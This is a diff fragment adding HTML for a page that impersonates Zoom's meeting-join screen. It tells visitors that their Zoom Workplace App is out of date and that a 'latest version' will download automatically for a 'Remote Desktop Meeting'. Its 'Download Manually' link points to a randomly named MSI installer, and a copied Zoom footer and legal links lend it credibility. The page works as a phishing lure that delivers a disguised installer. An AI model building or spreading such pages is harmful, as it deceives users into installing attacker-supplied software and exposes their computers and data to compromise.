+      document.getElementById('alertBox').style.display = 'none';
+    }
+  </script>
+    <div id="zoom-ui-frame" role="main" tabindex="0" class="I0MG3p8Q">
+      <div class="At6Ofnrg AJKPZk_N dLDxYimD">
+        <div class="jZWDYHYu"></div>
+      </div>
+      <div class="bhauZU7H">
+        <!---->
+        <div>
+		  <div class="ifP196ZE x2RD4pnS">
+            <h1 style="font-size: 35px;"><b>Joining Meeting</b></h1>
+            <h1 class="DPkTxDJ4" role="presentation">Sorry, You do not have the latest version of Zoom Workplace App installed.</h1>
+			<h1 class="DPkTxDJ4" role="presentation">The latest version of our Application will download automatically, kindly install to join the Remote Desktop Meeting.</h1>
+          </div>
+          <div class="ifP196ZE x2RD4pnS">
+            <h2 class="DPkTxDJ4">If the download doesn't start automatically, please <span><a onclick="window.location.href='ZoomWorkplace_YU0RHQEEFUV4_4DGDKXK8OSU8_windows_x64.msi';">Download Manually</a></span></h2>
+            <div onclick="showAlert()" role="button" tabindex="0" class="mbTuDeF1">Launch Meeting</div>
+          </div>
+          <hr role="presentation">
+          <div class="pUmU_FLW">
+            <h3 class="rm-presentation">By joining a meeting, you agree to our <a terms="" tabindex="0" role="button" href="https://zoom.us/en-us/terms">Terms of Service</a> and <a privacy="" tabindex="0" role="button" href="https://zoom.us/en-us/privacy">Privacy Statement</a></h3>
+            <!---->
+            <!---->
+          </div>
+        </div>
+      </div>
+      <!---->
+      <!---->
+    </div>
+    <div id="footer_container" role="contentinfo">
+      <div id="footer">
+        <p>©2026 Zoom Communications, Inc. <span>All rights reserved.</span>
+        </p>
+        <p class="LP3K7kSq">
+          <a href="https://zoom.us/en-us/trust" target="_blank">Trust Center |</a>
+          <a href="https://zoom.us/en-us/acceptable-use-guidelines" target="_blank">Acceptable Use Guidelines |</a>
+          <a href="https://zoom.us/en-us/trust/legal-compliance" target="_blank">Legal &amp; Compliance |</a>
+          <a href="https://www.zoom.com/en/trust/acceptable-use-guidelines/" tabindex="0" role="button"> Do Not Sell My Personal Information |</a>
+          <a href="https://www.zoom.com/en/trust" tabindex="0" role="button"> Cookie Preferences </a>
+        </p>
+      </div>
+    </div>
   </body>
 </html>
